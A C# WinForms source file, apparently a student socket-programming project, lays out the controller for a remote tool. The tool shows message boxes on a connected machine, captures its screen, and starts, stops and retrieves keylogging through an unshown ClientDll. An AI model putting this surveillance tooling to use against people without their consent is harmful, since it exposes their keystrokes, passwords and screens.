using System;
using System.Net.Sockets;
using System.Windows.Forms;
using System.IO;
using System.ComponentModel;
using System.Drawing;
using ClientDll;


namespace Client
{
    partial class Form1
    {
        private TextBox ta;
        private bool connectionState;

        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.vScrollBar1 = new System.Windows.Forms.VScrollBar();
            this.hScrollBar1 = new System.Windows.Forms.HScrollBar();
            this.ta = new System.Windows.Forms.TextBox();
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.b1 = new System.Windows.Forms.Button();
            this.t1 = new System.Windows.Forms.TextBox();
            this.groupBox2 = new System.Windows.Forms.GroupBox();
            this.btnDisconnect = new System.Windows.Forms.Button();
            this.label1 = new System.Windows.Forms.Label();
            this.txtServerIP = new System.Windows.Forms.TextBox();
            this.b2 = new System.Windows.Forms.Button();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.groupBox3 = new System.Windows.Forms.GroupBox();
            this.checkBox2 = new System.Windows.Forms.CheckBox();
            this.checkBox1 = new System.Windows.Forms.CheckBox();
            this.button1 = new System.Windows.Forms.Button();
            this.txtKeys = new System.Windows.Forms.TextBox();
            this.btnStopKeyLogging = new System.Windows.Forms.Button();
            this.btnGetKey = new System.Windows.Forms.Button();
            this.btnStartKeyLogging = new System.Windows.Forms.Button();
            this.groupBox1.SuspendLayout();
            this.groupBox2.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.pictureBox1.SuspendLayout();
            this.groupBox3.SuspendLayout();
            this.SuspendLayout();
            // 
            // vScrollBar1
            // 
            this.vScrollBar1.Dock = System.Windows.Forms.DockStyle.Right;
            this.vScrollBar1.Location = new System.Drawing.Point(701, 0);
            this.vScrollBar1.Name = "vScrollBar1";
            this.vScrollBar1.Size = new System.Drawing.Size(16, 296);
            this.vScrollBar1.TabIndex = 0;
            this.vScrollBar1.Scroll += new System.Windows.Forms.ScrollEventHandler(this.HandleScroll);
            // 
            // hScrollBar1
            // 
            this.hScrollBar1.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.hScrollBar1.Location = new System.Drawing.Point(0, 296);
            this.hScrollBar1.Name = "hScrollBar1";
            this.hScrollBar1.Size = new System.Drawing.Size(717, 16);
            this.hScrollBar1.TabIndex = 1;
            this.hScrollBar1.Scroll += new System.Windows.Forms.ScrollEventHandler(this.HandleScroll);
            // 
            // ta
            // 
            this.ta.AcceptsReturn = true;
            this.ta.AcceptsTab = true;
            this.ta.Location = new System.Drawing.Point(20, 270);
            this.ta.Multiline = true;
            this.ta.Name = "ta";
            this.ta.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.ta.Size = new System.Drawing.Size(387, 20);
            this.ta.TabIndex = 3;
            // 
            // groupBox1
            // 
            this.groupBox1.Controls.Add(this.b1);
            this.groupBox1.Controls.Add(this.t1);
            this.groupBox1.Location = new System.Drawing.Point(20, 156);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new System.Drawing.Size(387, 108);
            this.groupBox1.TabIndex = 4;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "Send Message";
            // 
            // b1
            // 
            this.b1.BackColor = System.Drawing.Color.Transparent;
            this.b1.FlatStyle = System.Windows.Forms.FlatStyle.Popup;
            this.b1.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F, System.Drawing.FontStyle.Bold);
            this.b1.ForeColor = System.Drawing.Color.Red;
            this.b1.Location = new System.Drawing.Point(6, 58);
            this.b1.Name = "b1";
            this.b1.Size = new System.Drawing.Size(375, 40);
            this.b1.TabIndex = 3;
            this.b1.Text = "Send Message ";
            this.b1.UseVisualStyleBackColor = false;
            this.b1.Click += new System.EventHandler(this.b1_Click);
            // 
            // t1
            // 
            this.t1.Location = new System.Drawing.Point(6, 32);
            this.t1.Name = "t1";
            this.t1.Size = new System.Drawing.Size(375, 20);
            this.t1.TabIndex = 4;
            // 
            // groupBox2
            // 
            this.groupBox2.Controls.Add(this.btnDisconnect);
            this.groupBox2.Controls.Add(this.label1);
            this.groupBox2.Controls.Add(this.txtServerIP);
            this.groupBox2.Controls.Add(this.b2);
            this.groupBox2.Location = new System.Drawing.Point(26, 14);
            this.groupBox2.Name = "groupBox2";
            this.groupBox2.Size = new System.Drawing.Size(381, 114);
            this.groupBox2.TabIndex = 5;
            this.groupBox2.TabStop = false;
            this.groupBox2.Text = "Connect To Server";
            // 
            // btnDisconnect
            // 
            this.btnDisconnect.Enabled = false;
            this.btnDisconnect.FlatStyle = System.Windows.Forms.FlatStyle.Popup;
            this.btnDisconnect.Location = new System.Drawing.Point(220, 64);
            this.btnDisconnect.Name = "btnDisconnect";
            this.btnDisconnect.Size = new System.Drawing.Size(121, 33);
            this.btnDisconnect.TabIndex = 5;
            this.btnDisconnect.Text = "Disconncet";
            this.btnDisconnect.UseVisualStyleBackColor = true;
            this.btnDisconnect.Click += new System.EventHandler(this.btnDisconnect_Click);
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(6, 26);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(51, 13);
            this.label1.TabIndex = 4;
            this.label1.Text = "Server IP";
            // 
            // txtServerIP
            // 
            this.txtServerIP.Location = new System.Drawing.Point(63, 23);
            this.txtServerIP.Name = "txtServerIP";
            this.txtServerIP.Size = new System.Drawing.Size(233, 20);
            this.txtServerIP.TabIndex = 3;
            this.txtServerIP.Text = "10.253.19.44";
            // 
            // b2
            // 
            this.b2.BackColor = System.Drawing.Color.Transparent;
            this.b2.FlatStyle = System.Windows.Forms.FlatStyle.Popup;
            this.b2.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F, System.Drawing.FontStyle.Bold);
            this.b2.ForeColor = System.Drawing.Color.Red;
            this.b2.Location = new System.Drawing.Point(63, 60);
            this.b2.Name = "b2";
            this.b2.Size = new System.Drawing.Size(135, 40);
            this.b2.TabIndex = 2;
            this.b2.Text = "Connect to server";
            this.b2.UseVisualStyleBackColor = false;
            this.b2.Click += new System.EventHandler(this.b2_Click);
            // 
            // pictureBox1
            // 
            this.pictureBox1.Controls.Add(this.vScrollBar1);
            this.pictureBox1.Controls.Add(this.hScrollBar1);
            this.pictureBox1.Location = new System.Drawing.Point(12, 320);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(717, 312);
            this.pictureBox1.TabIndex = 6;
            this.pictureBox1.TabStop = false;
            this.pictureBox1.Click += new System.EventHandler(this.pictureBox1_Click);
            this.pictureBox1.MouseDown += new System.Windows.Forms.MouseEventHandler(this.pictureBox1_MouseDown);
            // 
            // timer1
            // 
            this.timer1.Interval = 400;
            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
            // 
            // groupBox3
            // 
            this.groupBox3.Controls.Add(this.checkBox2);
            this.groupBox3.Controls.Add(this.checkBox1);
            this.groupBox3.Controls.Add(this.button1);
            this.groupBox3.Controls.Add(this.txtKeys);
            this.groupBox3.Controls.Add(this.btnStopKeyLogging);
            this.groupBox3.Controls.Add(this.btnGetKey);
            this.groupBox3.Controls.Add(this.btnStartKeyLogging);
            this.groupBox3.Location = new System.Drawing.Point(413, 12);
            this.groupBox3.Name = "groupBox3";
            this.groupBox3.Size = new System.Drawing.Size(337, 194);
            this.groupBox3.TabIndex = 10;
            this.groupBox3.TabStop = false;
            this.groupBox3.Text = "GEt Keys";
            // 
            // checkBox2
            // 
            this.checkBox2.AutoSize = true;
            this.checkBox2.Location = new System.Drawing.Point(235, 150);
            this.checkBox2.Name = "checkBox2";
            this.checkBox2.Size = new System.Drawing.Size(96, 17);
            this.checkBox2.TabIndex = 12;
            this.checkBox2.Text = "Get Continues ";
            this.checkBox2.UseVisualStyleBackColor = true;
            this.checkBox2.CheckedChanged += new System.EventHandler(this.checkBox2_CheckedChanged);
            // 
            // checkBox1
            // 
            this.checkBox1.AutoSize = true;
            this.checkBox1.Location = new System.Drawing.Point(128, 148);
            this.checkBox1.Name = "checkBox1";
            this.checkBox1.Size = new System.Drawing.Size(76, 17);
            this.checkBox1.TabIndex = 11;
            this.checkBox1.Text = "FullScreen";
            this.checkBox1.UseVisualStyleBackColor = true;
            this.checkBox1.CheckedChanged += new System.EventHandler(this.checkBox1_CheckedChanged);
            // 
            // button1
            // 
            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Popup;
            this.button1.Location = new System.Drawing.Point(17, 148);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(77, 23);
            this.button1.TabIndex = 10;
            this.button1.Text = "GetImage";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // txtKeys
            // 
            this.txtKeys.Location = new System.Drawing.Point(7, 19);
            this.txtKeys.Multiline = true;
            this.txtKeys.Name = "txtKeys";
            this.txtKeys.ScrollBars = System.Windows.Forms.ScrollBars.Both;
            this.txtKeys.Size = new System.Drawing.Size(323, 83);
            this.txtKeys.TabIndex = 3;
           
            // 
            // btnStopKeyLogging
            // 
            this.btnStopKeyLogging.Enabled = false;
            this.btnStopKeyLogging.Location = new System.Drawing.Point(128, 108);
            this.btnStopKeyLogging.Name = "btnStopKeyLogging";
            this.btnStopKeyLogging.Size = new System.Drawing.Size(107, 23);
            this.btnStopKeyLogging.TabIndex = 2;
            this.btnStopKeyLogging.Text = "Stop Key Logging ";
            this.btnStopKeyLogging.UseVisualStyleBackColor = true;
            this.btnStopKeyLogging.Click += new System.EventHandler(this.btnStopKeyLogging_Click);
            // 
            // btnGetKey
            // 
            this.btnGetKey.Enabled = false;
            this.btnGetKey.Location = new System.Drawing.Point(241, 108);
            this.btnGetKey.Name = "btnGetKey";
            this.btnGetKey.Size = new System.Drawing.Size(75, 23);
            this.btnGetKey.TabIndex = 1;
            this.btnGetKey.Text = "Get Keys";
            this.btnGetKey.UseVisualStyleBackColor = true;
            this.btnGetKey.Click += new System.EventHandler(this.btnGetKey_Click);
            // 
            // btnStartKeyLogging
            // 
            this.btnStartKeyLogging.Location = new System.Drawing.Point(19, 108);
            this.btnStartKeyLogging.Name = "btnStartKeyLogging";
            this.btnStartKeyLogging.Size = new System.Drawing.Size(103, 23);
            this.btnStartKeyLogging.TabIndex = 0;
            this.btnStartKeyLogging.Text = "Start Key Logging";
            this.btnStartKeyLogging.UseVisualStyleBackColor = true;
            this.btnStartKeyLogging.Click += new System.EventHandler(this.btnStartKeyLogging_Click);
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(759, 644);
            this.Controls.Add(this.groupBox3);
            this.Controls.Add(this.pictureBox1);
            this.Controls.Add(this.groupBox2);
            this.Controls.Add(this.groupBox1);
            this.Controls.Add(this.ta);
            this.KeyPreview = true;
            this.MaximizeBox = false;
            this.Name = "Form1";
            this.Text = "Socket Programming";
            this.Closing += new System.ComponentModel.CancelEventHandler(this.form1_closing);
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Form1_FormClosing);
            this.Load += new System.EventHandler(this.Form1_Load);
            this.KeyUp += new System.Windows.Forms.KeyEventHandler(this.Form1_KeyUp);
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            this.groupBox2.ResumeLayout(false);
            this.groupBox2.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.pictureBox1.ResumeLayout(false);
            this.groupBox3.ResumeLayout(false);
            this.groupBox3.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private void b2_Click(object sender, EventArgs e)
        {
            if (txtServerIP.Text.Trim() == "")
            {
                MessageBox.Show("Please Fill Server IP");
            }
            else
            {
                if (ConnectToServer(txtServerIP.Text, 1020))
                    b2.Enabled = false;
                btnDisconnect.Enabled = true;
            }
        }


        private void b1_Click(object sender, EventArgs e)
        {
            
            ta.Text = "";
            if (t1.Text == "")
            {
                MessageBox.Show("Please enter something in the textbox");
                t1.Focus();
                return;
            }
            else
            {
                client.ShowMessageBox(t1.Text);

            }
        }

        private void SendMessage(string message)
        {
            try
            {
             string response  = client.SendMessage(message);
             if (response == "error")
                 MessageBox.Show(response);
            }
            catch (Exception ee)
            {
                MessageBox.Show("Exception reading from Server:" + ee.ToString());
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            GetScreen();
           // HandleScroll();
        }

        public void GetScreen()
        {
               try
            {
                pictureBox1.Image = client.GetScreen();
                ta.Text = "Reading Message";
                
               // ta.Text = s;
            }
            catch (Exception ee)
            {
              // MessageBox.Show("Exception reading from Server:" + ee.ToString());
            }


        }
    

        private bool ConnectToServer(string serverIP , int port)
        {
            try
            {
                if (!client.ConnectToServer(serverIP))
                    throw new Exception("Error");
                    MessageBox.Show("Connected");
            }
            catch(Exception ex)
            {
                MessageBox.Show("Failed to connect to server at {0}:999", "localhost");
                return false;
            }

            return true;
            //get a Network stream from the server

            //========================================
   
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            try
            {
                         
            }
            catch (Exception ex)
            {

            }
        }


        public void form1_closing(object o, CancelEventArgs ec)
        {
            //close all streams...
            try
            {
                client.Dispose(true);
            }
            catch (Exception ex)
            {
                
            }
        }

        private GroupBox groupBox1;
        private Button b1;
        private TextBox t1;
        private GroupBox groupBox2;
        private Button b2;
        private Label label1;
        private TextBox txtServerIP;
        private PictureBox pictureBox1;
        private Timer timer1;
        private Button btnDisconnect;
        private GroupBox groupBox3;
        private TextBox txtKeys;
        private Button btnStopKeyLogging;
        private Button btnGetKey;
        private Button btnStartKeyLogging;
        private CheckBox checkBox2;
        private CheckBox checkBox1;
        private Button button1;
        private VScrollBar vScrollBar1;
        private HScrollBar hScrollBar1;


    }
}


